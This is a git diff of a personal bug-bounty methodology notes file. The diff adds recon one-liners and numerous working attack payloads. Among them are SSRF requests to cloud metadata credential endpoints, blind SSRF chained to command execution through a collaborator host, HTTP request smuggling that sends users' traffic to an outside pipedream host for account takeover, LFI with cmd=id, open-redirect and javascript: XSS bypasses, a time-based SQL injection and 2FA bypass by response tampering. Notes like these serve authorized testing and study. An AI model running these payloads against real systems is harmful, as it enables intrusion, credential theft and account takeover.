@@ -27,10 +27,6 @@ how to use files everywhere
 
 
 
-smarthackerone1@gmail.com
-githubtesting049@gmail.com
-alastly38@gmail.com
- 
                 my recon section
          place all the target in burpdsite  
                                  1
@@ -93,6 +89,7 @@ alastly38@gmail.com
                  httpx and httprobe
                  
                  # Check status of urls and make new file
+                 
                   cat all_urls.txt | httpx -mc 200 | tee live_urls.txt   
                   cat | grep -E  (url ) | sort -u | tee -u | tee all_url.txt 
                  httpx -l subdomains.txt -ports 80,8080,8000,8888 -threads 200 > subdomains_alive.txt
@@ -127,6 +124,8 @@ alastly38@gmail.com
                  finding parameters, 
                  arjun , paramspider ,gf  check github
                  
+                 paramspider -l domains.txt       check its saving of fills  
+                 
         
                  
                  arjun -u https://www.example.com/file.php 
@@ -135,13 +134,21 @@ alastly38@gmail.com
                  
                  5
                  URL RECON - EXTRACTION  and find sensitive files 
-                 gau, gospider, katana
+                 gau, gospider, katana, gauplus
+                 
+                      katana
+                 $ cat in_scope.txt
+                login/
+                 admin/
+                 app/
+                wordpress/
+                 katana -u https://tesla.com -cs in_scope.txt
                  
                  gau
                  echo "url" |gau | tee gau.txt
-                  cat gau.txt | grep -E [.]js | tee javascript.txt,
+           
                  
-              echo "url" | gau | tee gau.txt         
+                   
                cat gau.txt | grep ? | tee param.txt     /// filter out url
   gau $mytarget|egrep -iv '\.json'|grep -iE '\.js'|antiburl|awk '{print $4}' | xargs -I %% bash -c 'python3 SecretFinder.py -i %% -o cli -r "$anything"'
                   
@@ -175,7 +182,13 @@ alastly38@gmail.com
                  
                  
                      JAVASCRIPTS FILES
-               cat param.txt | grep -E *[.]js | tee javascript.txt     filter out javascript
+                      
+               
+                 
+                   
+               cat gau.txt | grep ? | tee param.txt     /// filter out url
+                  
+              cat param.txt | grep -E '\.js$' | tee javascript.txt  filter out javascript
                echo TARGET.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript' | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt
                
                    search javascript file
@@ -360,6 +373,13 @@ hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egr
           cat domain.txt | gauplus -subs | httpx -sc -nc | grep "403\|401" | anew unauted.txt      check 403 bypass github
           
           cat domain.txt | gauplus -subs | httpx -title | grep -l "admin\|login\|dashboard" | anew loginpanel.txt   //add more keyword
+          
+          
+          USING KATANA
+          katana -list url_list.txt
+          echo “https://tesla.com” | katana
+          katana -u https://tesla.com,https://google.com
+          subfinder -d tesla.com -silent | httpx -silent | katana
                
                        
  whatweb -a 3 (url)
@@ -1221,6 +1241,15 @@ to test for this business logic flaw:
   GET /graphql.php?query=
    [...]
    
+   tip 
+   sometimes, always, sometimes,  manually built the GET request from the POST
+   GET /api/v1/reportservice/details/{clientname}/456 HTTP/2
+   
+   
+   
+   
+   
+   
    
    tip
 [ ] json parameter pollution
@@ -1323,6 +1352,17 @@ use tools like arjun , paramminer
  If you were to provide user_id=1338-1 and it was vulnerable, then the code would execute against user_id=1337. The code
 
 $sql = "UPDATE users SET name='test' WHERE id='1338-1'"; will be executed as being user id 1337
+
+
+
+   tip in any website building website   under different accounts
+   create two account, domianone and domain two
+    change the landing page’s website name to the second account’s domain. 
+    Navigating to the match and replace section on  burpsuite, I  replaced every instance of domainone.com with domaintwo.com
+     ventured into the second account’s domain — domaintwo.com. Uploading new pages, tweaking configurations 
+     
+   
+   
  
  
    
@@ -1817,10 +1857,23 @@ To check the randomness of the OTP I decided to send many requests at a time in 
    4. Send the request and you got 200 OK as a response.
 
      . Login to the victim account with the new password and here we go you successfully accessed his account.
+     
+     
+      tip
+      1. Forgot password => Enter email => Receive email with link:
+      Click on this link to reset your password.The link expires in...          the link  /passreset/<token>
+      click on it 
+      Filling in the 2 fields, sending and intercepting :
+      check for id parameter in the request of burpsurp
+      mauipulate the response  and check for user roles 
    
    
    
    403 BYPASS    403 BYPASS     403 BYPASS
+   
+   https://github.com/iamj0ker/bypass-403
+   
+   
    
    ## Change request method:
 
@@ -1936,6 +1989,15 @@ It involves altering the case of characters in the URL path to try and bypass ac
 
    
    2FA BYPASS      2FA BYPASS         2FA BYPASS              2FA BYPASS
+   
+   
+   There are several ways to bypass the OTP, 
+
+I attempted to brute force the OTP code, but there was a rate limit, so I failed.
+I experimented with magic OTPs, and as you can guess, I failed.
+I tested a Race condition on OTPs, and again, I failed.
+   
+   
    
      Bypassing two-factor authentication
 [ ] Flawed two-factor verification logic Sometimes flawed logic in two-factor authentication means that
@@ -2119,6 +2181,12 @@ Browser B: The attacker substitutes the session ID with Browser A's session ID a
 
 Browser B: The converter page generates a JWT for the attacker, enabling successful authentication as the victim who has 2FA enabled
 
+  tip  tip
+Create an account https://example[.]com/register
+Fill in all the required data enter the phone number and send the form.
+We will receive a five-digit OTP on the phone number used for registration. Enter any random 5 digits, e.g. 00000
+Intercept the request with burp suite proxy, choose the option “Do intercept >> response to this request” and hit Forward.
+5. We will receive a response with 500 500, modify it to 200 OK, and forward the request
 
 
 
@@ -2930,7 +2998,7 @@ Origin:attacker.com/target.com
 
   
     LOCAL/REMOTE FILE INCLUSION (LFI/RFI)      LOCAL/REMOTE FILE INCLUSION (LFI/RFI)                LOCAL/REMOTE FILE INCLUSION (LFI/RFI)
-    
+    http://example.com/index.php?log_file=/var/log/apache2/access.log&cmd=id
     
     You can test for this issues in two ways:
 
@@ -3277,6 +3345,30 @@ header('Location: http://127.0.0.1:8080/status');
 0x7f.0x1.0x0.0x1
 0x7f.0x1.0x1
 
+
+    http://[::]:80/
+http://[::]:25/ SMTP
+http://[::]:22/ SSH
+http://[::]:3128/ Squid
+http://[0000::1]:80/
+http://[0000::1]:25/ SMTP
+http://[0000::1]:22/ SSH
+http://[0000::1]:3128/ Squid
+
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://[::ffff:127.0.0.1]
+
+
+  http://169.254.169.254/latest/meta-data/iam/security-credentials
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+
+# Examples
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+
+
+
 # Blind SSRF
 - Review Forms
 - Contact Us
@@ -3337,6 +3429,7 @@ header('Location: http://127.0.0.1:8080/status');
   
   tip
   SSRF are ❤️
+  
 
 file:///etc/passwd : Not authorized
 file://\/\/etc/passwd : Work
@@ -3530,6 +3623,124 @@ Attacker signs into HelloSign, uploads the created drive file to it, and interce
 Inject the ?alt=media parameter in the file id value
 Get the AWS metadata in the response
   
+  or 
+  created .html file with the code and pasted the copied payload and saved the file  
+ <html>
+<body>
+<img src=http://<BurpCollaboratorURL></img>
+</body>
+</html>
+
+  upload the doucment and wait for a pingback
+  
+  
+  
+  
+        TIP WITH GITHUB RECON   ON SSRF
+        gau -subs example.com | unfurl domains>> vul1.txt
+        waybackurls example.com | unfurl domains >> vul2.txt
+        subfinder -d example.com -silent >> vul3.txt
+        
+        sorting
+        cat vul1.txt vul2.txt vul3.txt | sort -u >> unique_sub.txt
+        
+        github recon 
+        “testdev.admin.example.com” user:<username> auth_token
+
+        “testdev.admin.example.com” user:<username> apikey
+
+         “testdev.admin.example.com” user:<username> secret
+         find parameters
+         “corps.example.com” org:<name of organization> “/admin/dashboard”
+
+         “testdev.example.com” org:<name of organization> “/users/dashboard”
+
+           “example.com” org:<name of organization> “/admin/setup”
+        “example.com” org:<name of organization> “next_url”
+
+          “example.com” org:<name of organization> “img_url”
+
+         Still no success But when i use these parameter “image”
+            “example.com” org:<name of organization> “image”
+            
+        got     /fetch/info?inquiry=&image_Host=https://example.com/user/         // check if you can get and url
+        
+            use aws metadata instance
+            curl -sk “https://example.com/fetch/info?inquiry=&image_Host=http://169.254.169.254/”   got somany endpoint
+            
+            text the endpoint on all subdomain
+            cat unique_sub.txt | sort -u | httpx -silent -path “/fetch/info?inquiry=&image_Host=http://169.254.169.254/” -status-code -content-length    //more ssrf
+            
+         
+         TIP ON BLIND SSRF TO RCE
+         gf ,qsreplace ,ffuf ,gau ,waybackurls
+         
+        gau -subs example.com; subfinder -d example.com -silent |waybackurls | gf ssrf | sort -u >> testblindssrf.txt
+        
+        cat testblindssrf.txt | qsreplace “http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net" >> ssrfuzz.txt
+        
+        ffuf -c -w ssrfuzz.txt -u FUZZ -t 200
+        Now we will check whetherwe get any http request hit on our burp collaborator server
+        if the is, chain to RCE  exampe
+        http:/devtest.exampl.com/import/picture?next_image=http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net?`whoami`
+        
+        
+        Finding SSRF BY Full Automation
+        waybackurl targetme.com >> blindssrftesturl.txt
+        gau -subs targetme.com >> blindssrftesturl.txt     
+        
+        cat blindssrftesturl.txt | sort -u |anew | httpx | qsreplace ‘http://169.254.169.254/latest/meta-data/hostname’ | xargs -I % -P 25 sh -c ‘curl -ks “%” 2>&1 | grep ”compute.internal” && echo “SSRF VULN! %”’
+        or
+        cat blindssrftesturl.txt | sort -u |anew | httpx |tee -a prefinal_ssrftesturl.txt  
+        cat prefinal_ssrftesturl.txt | gf ssrf >> final_ssrftesturl.txt
+        
+        cat final_ssrftesturl.txt |qsreplace “Burp collaborator server” >> ssrf_auto-ffuf.txt
+
+        ffuf -c -w ssrf_auto-ffuf.txt -u FUZZ
+
+       Then check for any dns pingback hit you burp collaborator server.
+
+        IF you get any ping back and go for internal port scanning.
+        
+        
+        
+        CHANGING TO SVG IMAGE TAG
+        <svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"> 
+<image height="30" width="30" 
+xlink:href="https://controlledserver.com/pic.svg" /> 
+</svg>
+
+  
+  
+    When modifying the HTTP request that is sent, an attacker can do Server Side Request Forgery. The attacker simply has to specify a filename ending in .png, but use Content-Type image/svg+xml and the file content as well an SVG file.
+        
+        
+        
+         \\\\\\\\NOTE NOTE NOTE NOTE NOTE NOTE ////////
+         
+         the often overlooked ability to use an @ to create a misleading URL is frequently useful.
+
+To understand why, you should know that, according to RFC 3986, the presence of a @ character in the authority part of a URL has a very specific meaning: it marks the end of the (optional) userinfo part and the beginning of the host part. By appending @attacker-site.com to the host part of a URL, you can often coax an incautious server into sending a request to attacker-site.com rather than to the originally intended host. This trick has worked for me time and time again, and this occasion was no exception. By issuing the following request, I was again able to obtain a 502 Bad Gateway response from the proxy.
+
+GET /https://pro-api.coinmarketcap.com@exfil.jub0bs.com HTTP/1.1
+Host: proxy.example.org
+--snip--
+
+HTTP/1.1 502 Bad Gateway
+--snip--
+(Note: I could have simply leveraged Burp Collaborator here, but I wasn’t aware of that feature at the time.)
+
+Had I managed to trick the proxy into sending a request to my exfil subdomain? To check this, I deployed a minimal server to exfil.jub0bs.com. I repeated that last attack and immediately inspected my server’s log files. Waiting for me there was a new log entry about a recent HTTP request. “Success!”, I exulted.
+
+
+   web cache rulles withb ssrf
+   
+   GET  https://www.example.com/page.css=(http://169.254.169.254/latest/meta-data/      ====   response is no cached
+     GET  https://www.example.com/page.css=(http://169.254.169.254/latest/meta-data?     ==== response is cached 
+     
+     GET  https://www.example.com/page.css= (http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance?   ==== response is cached
+     
+      
       
       
       
@@ -3828,6 +4039,71 @@ Here's the link to the template - https://github.com/projectdiscovery/nuclei-tem
            
            
            HTTP REQUEST SMUGGLING      HTTP REQUEST SMUGGLING         HTTP REQUEST SMUGGLING
+           
+           methodology
+           
+           
+           1.Using HTTP Request Smuggling Burp Extension either burp community or pro. you can widen your scope by adding more subdomains and URLs select them all and from the extension tab click smuggle probe.
+
+‌2. Using smuggler.py tool which is a command line tool that replicate almost the same work of burp extension.
+
+# Single Host:
+python3 smuggler.py -u <URL>
+
+# List of hosts:
+cat list_of_hosts.txt | python3 smuggler.py
+‌Note: These scanner will not guarantee the existing of vulnerability, there are false positives so you need to validate every finding of any of these tools. ‌
+    FINDINGS
+    
+    run burp extension scanner on all the subdomain   and check for the response
+    validate findings by sending some chunked data
+    POST / HTTP/1.1 
+Host: subdoamin.readcted.com
+Upgrade-Insecure-Requests: 1 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 7 
+Transfer-Encoding: chunked 
+Transfer-encoding: identity
+
+
+1
+A
+0
+
+  To exploit HTTP Request Smuggling Vulnerability you have to use turbo intruder to be able to send concurrent request and to receive the smuggled one before it reach the user. we will send the following request:
+
+POST / HTTP/1.1
+Host: redacted.com
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+Transfer-Encoding: chunked
+Transfer-encoding: identity
+
+0
+
+GET /video HTTP/1.1
+Foo: x
+
+    Escalating to Full Account takeover
+Now let’s craft our request that will be smuggled to send our malicious one. I will request bin to receive users traffic into my endpoint. the payload shall looks like the following: ‌
+
+POST / HTTP/1.1
+Host: redacted.com
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 91
+Transfer-Encoding: chunked
+Transfer-encoding: identity
+
+0
+
+GET /video HTTP/1.1
+Host: enfliy4kmrr8i.x.pipedream.net
+Foo: x
+    
+           
+           
            dump two request at a time  change the http/2 tp http/1 , and focus on  the second request that no user agent is involved 
             example 
              GET /test?a=a% HTTP/1.1
@@ -3842,7 +4118,54 @@ Here's the link to the template - https://github.com/projectdiscovery/nuclei-tem
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
 
 GET /admin/login HTTP/1.1
-Host: admin.target.com Cache possioning        
+Host: admin.target.com Cache possioning       
+
+
+
+     tip  
+     For this particular HHI case, it is only exploitable by adding a letter /a as a GET parameter (I tried with other letters, and only this one worked -weird-), allowing the redirection of the domain *****.net to evil.com.
+   GET /a  http 1/1
+   host: eveil.com
+   
+   
+   verification 
+   Request
+   POST /  http1/1
+   host: victiom.com
+   transfer encoding : chunked
+   content-leghth : 51
+   6
+   DESYNC
+   0
+   
+     GET /a  http 1/1
+   host: eveil.com
+   
+    the above request gave out the responses
+    
+    while exploring the above request, run a noumber of request like the example below
+       POST /  http1/1
+   host: victiom.com
+   transfer encoding : chunked
+   content-leghth : 51
+   6
+   DESYNC
+   0
+   
+     GET /a  http 1/1
+   host: a: 11111111111
+   
+   11 characteres 1 = 65535
+   10 characteres 1 = 13767
+    
+   
+   
+      
+
+
+
+
+
                                                    
                                                    Web Cache deception       Web Cache deception
            we manage to force the Load Balancer into caching our request on a specific crafted path of ours, we will be able to read our victim's sensitive data from the cached response.It wasn't straight-forward in this case
@@ -3868,6 +4191,26 @@ When accessing a page like http://www.example.com/home.php/non-existent.css, the
 Configure the cache mechanism to cache files only if their HTTP caching headers allow. That will solve the root cause of this issue.
 If the cache component provides the option, configure it to cache files by their content type.
 Configure the web server so that for pages such as http://www.example.com/home.php/non-existent.css, the web server doesn’t return the content of "home.php" with this URL. Instead, for example, the server should respond with a 404 or 302 response.
+
+
+   tip
+   Guess everything using Param Miner extension.
+   check for unkeyed header in the request  of param miner
+    added the `X-Forwarded-Host: example.com`  in burp repeter , host header in the first request and checked the response.
+   the original host will be over written with example.com
+   open the url in the private browser and check if The example.com was still showing in the response  and then excalte to xss or html injection
+   
+   below is the html injection
+   GET /blog?abcde=234 HTTP/2
+Host: www.test.com
+User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
+X-Forwarded-Host: test.com"><h1>themarkib0x0
+Accept-Encoding: gzip, deflate, br
+Content-Length: 2
+           
+           
+           
+           
            
            Web Cache poisoning     Web Cache poisoning       Web Cache poisoning 
            
@@ -3885,6 +4228,36 @@ cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk  -v  -
    (1) i spray that parameter to other endpoint of the web application.
 (2) I always look into wayback machine for old urls to see if it have same or similar parameter.
 (3) Google dorks to see if i can get the same parameter in another endpoint.
+
+  tip tip  tip  tip
+  First if the Applictaion have a user sign-In/Sign-Up feature,then register a user and log in as the user.
+
+Go to your user profile page, for example: testvuln.com/accounts/profile
+2. Copy the profile page's URL
+
+3. Logout and Clear all the cookies and go to the homepage of the site.
+
+4. Paste the Copied Profile URL on the address bar
+
+5. If the site prompts for a login,check the address bar,you may find the login page with a redirect parameter like the following:
+
+https://testvuln.com/login?next=/accounts/profile
+
+https://testvuln.com/login?returnUrl=/accounts/profile
+
+2. How To Bypass
+Use `@`
+https://testvuln.com/login?next=https://vuln.me@evit.com
+
+- due to bad regex
+
+Use url encoded
+https://testvuln.com/login?next=http://evil%E3%80%82com
+
+- By using the character.(%E3%80%82 url encoded)instead of a normal dot in urls,it is possible to bypass the blocking.
+
+3. Try to leverage it to Xss
+https://testvuln.com/login?next=javascript:alert(1);//
    
    
    
@@ -3946,6 +4319,21 @@ grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -
  If you were to provide user_id=1338-1 and it was vulnerable, then the code would execute against user_id=1337. The code
 
 $sql = "UPDATE users SET name='test' WHERE id='1338-1'"; will be executed as being user id 1337
+
+
+   tip   tip 
+   stumbled on subdomain giving 403    example legacypanel.redacted.com
+   added a path to it and watch the response 
+   legacypanel.redacted.com/dummy, check the response to check if it gives 404
+   indicating 404 means that the 403 restriction was only applied on the main domain and not on other paths.
+   fuzz and bruteforce  to get other paths and get the register box
+   1234’ %2F%2A%2A%2FAnd%2F%2A%2A%2Fsleep(5)   on the resgiter page /// try other bypass if blocked by waf
+   
+  
+   
+   
+   
+   
  
  
  
@@ -4653,3 +5041,254 @@ xss%27;eval.call`${%27alert\x28window.origin\x29%27}`;//
     COMMAND THAT (TO BE EXECUTED ONCE A MONTH -MORE OR LESS
     
     today=$(date '+%Y-%m-%d'); cat subdomains.txt | httpx -follow-redirects -json -silent | tee active_subdomains_$today.json | jq -r '[.url,.content_length,.title,.host,.status_code] | @csv' | tee urls_modified_raw_$today.csv | anew -d urls_modified_raw_old.csv | cut -d',' -f1 | sed 's/"//g' | ./program active_subdomains_clean_$today.csv active_subdomains_clean_old.csv | tee urls_modified_clean_$today.txt | nuclei -silent -exclude-severity info,low | tee nuclei_urls_modified_$today.txt | notify; cp urls_modified_raw_{$today,old}.csv
+
+
+  API TESTING AND  METHODOLOGY        API TESTING AND  METHODOLOGY        API TESTING AND  METHODOLOGY            API TESTING AND  METHODOLOGY 
+  
+  API documentation is often publicly available, particularly if the API is intended for use by external developers. If this is the case, always start your recon by reviewing the documentation. 
+  
+    
+   if you identify the resource endpoint of /api/swagger/v1/users/123, then you should investigate the following paths:  or fuzz  directly fuzz for documentation. 
+    /api/swagger/v1/users/123,
+    /api/swagger/v1
+    /api/swagger
+    /api
+    
+        /api/tasks 
+    GET /api/tasks - Retrieves a list of tasks.
+    POST /api/tasks - Creates a new task.
+    DELETE /api/tasks/1 - Deletes a task.
+    
+    
+   check for patterns that suggest API endpoints in the URL structure, such as /api/. Also look out for JavaScript files, it could  contain  API endpoints that you haven't triggered directly via the web browse
+
+    /api/tasks 
+    GET /api/tasks - Retrieves a list of tasks.
+    POST /api/tasks - Creates a new task.
+    DELETE /api/tasks/1 - Deletes a task.
+
+ tip tip
+ API endpoints often expect data in a specific format, it may therefore behave differently depending on the content type of the data provided in a request. Changing the content type may enable you to: 
+ 
+    Trigger errors that disclose useful information.
+    Bypass flawed defenses.
+    Take advantage of differences in processing logic. For example, an API may be secure when handling JSON data but susceptible to injection attacks when dealing with XML.
+    
+    mass assignment  vuln
+    PATCH REQUEST
+    {
+    "username": "smart",
+    "email": "smart@example.com",
+    "isAdmin": false,
+}
+ TO  And the watch the behaviour
+ {
+    "username": "smart",
+    "email": "smart@example.com",
+    "isAdmin": "foo",
+}
+ TO
+ {
+    "username": "smart",
+    "email": "smart@example.com",
+    "isAdmin": true,
+}
+  browse the application as smart to see whether you can access admin functionality
+
+NOTE 
+  make sure you are recording all requests and responses. This will help to download and save all the client side code, cookies, and session data while allowing you to collect all the routes, endpoints, parameters, and JSON data to help you get a good picture of what is going on. and it  So important to make sure you click on every link, feature, and function that you can.
+  
+  It’s always a good idea to use the highest tier of the application you are testing and enable all features and functions that you can. This will help expose you to the largest surface area of the application.
+   don’t just assume you’ve seen it all. Always look for indicators of more functionality
+   ****  Check if  removing a paging parameter bring back the entire recordset? Could it make the application unresponsive as it tries to query and pull back all the data? Or does it bring back a known set of data? What if you modify it to bring back an unreasonable number of records? How does that impact application behavior?
+  check  how the application itself handles authentication and authorization 
+  
+  ***Token misuse :  how are API requests authorized? JSON Web Tokens (JWT) or some other opaque data? Are they passed in by an authorization header, some other header, or maybe through a cookie
+  
+  ***Missing or Mismatched AuthZ : use burpsuite  authorize to find this issues, sometimes developers forget to add logic to authorize requests
+  
+  ****Cross Tenant Data Leakage : check using CeWL as  a custom word list generator         //https://danaepp.com/a-cewl-way-for-api-discovery
+           feed cewl to the url , eample below
+           cewl 'https://developer.microsoft.com/en-us/graph/changelog/rss/search=&filterBy=beta,Addition' -m 10 -w graph-beta-adds.txt
+         cewl 'https://developer.microsoft.com/en-us/graph/changelog/rss/?search=&filterBy=beta,Addition,Identity%20and%20access' -m 10 -w graph-beta-iam-adds.txt
+  and then  feed the wordlist to your favorite API discovery bruteforcer like Burp Intruder, feroxbuster, ffuf, gobuster, kiterunner   
+           
+  
+  
+  
+  note: always map how data is passed arround the app, check the structure and schema of objects being passed around. Or how the front end may include logic for input validation that the API itself may not.security controls like rate limiting may impact how much data can be pulled back from an API. Or the fact an API might return too much data that developers may filter out in the front end code, far too late in the process.
+  .......... Discovering the patterns developers use to handle data can help inform how you construct your attack payloads, Watch how data is structured
+  As an example, do they access data through query parameters on a resource like 
+  https://api.example.com/users?name=dana  or do they use a more RESTful URI structure like 
+  https://api.example.com/users/dana    that uses route paths as the params? , check how it handles  json to xml or yaml data
+  
+  
+  ****CRAFT ROGUE API DOCS FOR A TARGET WHEN THEY DON’T EXIST******      https://danaepp.com/how-to-craft-rogue-api-docs-for-a-target-when-they-dont-exist
+  parsing live traffic to and from a web service to  burp and zap
+  and also from dev tools and collect all this traffic and then save it to files for processing later
+  
+tools to check -->  https://github.com/alufers/mitmproxy2swagger
+  steps  
+ ***  install https://github.com/alufers/mitmproxy2swagger
+ ***  set Once in devtools, make sure you select to “Preserve log” and “Disable cache“ in the network tab, This will ensure you record all requests across pageload
+ ***  Use the application normally to collect traffic, sign-up, register,password reset, profile update, possible signup for an account with admin privileges, 
+           if confident that you have figured out everything the application can do, we can start moving towards weaponizing all this data.
+ 
+ ***  Generate an HTTP Archive (HAR):   use the export tool, which typically looks like a down arrow in devtools 
+       
+ ***   Import HAR file to create OpenAPI definition :  leverage mitmproxy2swagger to convert the HAR into a rough OpenAPI definition file
+       example-> mitmproxy2swagger -i crapi.apisec.ai.har -o crapi.yaml -p http://crapi.apisec.ai -e -f har
+       
+ ****    Edit the definition files to describe API endpoints
+            Open the YAML definition file in your favorite editor and take a look.
+           Notice you have a ton of lines that start with “- ignore:/” under the x-path-templates. 
+           Go through the file and remove the “ignore:” on any request that appears to be an API call
+           
+ *****     Generate OpenAPI documentation from the definition
+             Now run the same command line to execute a second pass against the definition file:
+             mitmproxy2swagger -i crapi.apisec.ai.har -o crapi.yaml -p http://crapi.apisec.ai -e -f har
+               Open up the YAML file again. Look how much it has changed.
+               
+ ****      Test the OpenAPI document in Swagger Editor  -->   https://editor.swagger.io
+            Expand any  of the endpoints and take a look at how well defined it is:
+            
+            ***HOW TO USE YOUR ROGUE API DOCS IN POSTMAN ***
+             hook up Postman and BurpSuite together
+             Start up Postman. Click on Workspaces → Create Workspace and name it something unique that represents your engagemen
+             Import OpenAPI definition file
+                On the top left side of the workspace, beside the name you called it, is an Import button. Click that. When prompted use the explorer to 
+                find the YAML file you have created. Then hit the Import button.
+                can start firing off requests! Don’t forget to start up Burp
+                
+            ****   ***    ***
+            With a little effort, you should now have your own custom API documentation that follows the OpenAPI specification. This allows you to use Postman and BurpSuite together to attack the target API with more precision, and allows you to test endpoints that may or may not be know from any existing or old documentation
+            
+            
+            
+            
+            
+            
+            
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+ 
+ 
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+
+
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+
+ 
+    
+    
+    
+    
+    
+
+ 
+ 
+
+  
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
